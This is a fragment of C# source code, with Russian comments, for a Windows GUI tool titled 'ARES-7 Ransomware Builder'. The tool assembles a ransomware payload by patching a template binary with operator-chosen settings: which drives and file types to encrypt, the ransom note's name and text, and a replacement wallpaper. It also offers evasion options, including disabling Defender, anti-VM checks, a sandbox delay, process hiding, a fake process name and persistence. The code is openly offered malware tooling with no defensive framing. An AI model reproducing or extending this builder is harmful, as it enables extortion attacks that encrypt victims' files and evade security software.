...
namespace RansomwareBuilder
{
    public partial class Form1 : Form
    {
        ...
        {
            this.Text = "ARES-7 Ransomware Builder v10.0 (Patcher)";
            ...
            btnBuild = new Button();
            btnBuild.Text = "BUILD RANSOMWARE (Patcher)";
    ...
    for (int i = 0; i < data.Length - markerBytes.Length; i++)
    {
        ...
        private void BtnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                ...
                string algoValue = algorithm == "AES-256" ? "0" : algorithm == "Salsa20" ? "1" : "2";
                ...
                lblDetail.Text = "Patching binary...";
                
                // Патчим строковые переменные
                PatchBinary(template, "|DRIVES|", string.Join("|", selectedDrives));
                PatchBinary(template, "|EXTS|", string.Join("|", selectedExts));
                PatchBinary(template, "|ENC_EXT|", encryptedExt);
                PatchBinary(template, "|NOTE_NAME|", noteName);
                PatchBinary(template, "|NOTE_CONTENT|", noteContent);
                PatchBinary(template, "|FAKE_NAME|", txtFakeProcessName.Text);
                PatchBinary(template, "|WALLPAPER_BASE64|", wallpaperBase64);
                PatchBinary(template, "|WALLPAPER_EXT|", wallpaperExt);
                
                // Патчим булевы переменные
                PatchBinary(template, "|ALGO|", algoValue);
                PatchBinary(template, "|FAKE_ENABLED|", chkFakeProcess.Checked ? "1" : "0");
                PatchBinary(template, "|HIDE_ENABLED|", chkHideProcess.Checked ? "1" : "0");
                PatchBinary(template, "|ANTI_VM|", chkAntiVM.Checked ? "1" : "0");
                PatchBinary(template, "|DEFENDER|", chkDisableDefender.Checked ? "1" : "0");
                PatchBinary(template, "|PERSISTENCE|", chkAddPersistence.Checked ? "1" : "0");
                PatchBinary(template, "|HIDE_FILES|", chkHideFilesAttr.Checked ? "1" : "0");
                PatchBinary(template, "|DELAY|", chkSandboxDelay.Checked ? "1" : "0");
